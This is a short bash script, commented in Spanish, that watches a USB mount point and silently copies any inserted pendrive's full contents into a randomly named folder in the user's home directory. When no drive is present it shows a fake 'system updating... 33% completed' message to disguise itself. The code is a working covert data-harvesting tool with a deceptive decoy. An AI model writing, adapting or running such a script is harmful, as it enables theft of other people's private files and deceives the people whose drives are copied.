#!/bin/bash
FILE=/media/santi/
#DATE=$(date +"%H-%M-%S")
while true; do
#cambiar por el archivo, comprobar con los pendrives
if [ "$(ls $FILE)" ]
then
  sudo cp -r $FILE /home/santi/$RANDOM
  sleep 20
else
  echo "Actualizando o sistema... 33% completado"
fi
#cambiar por el usuario, atento la línea del copiado (revisa antes que aparece)
sleep 30
done
      
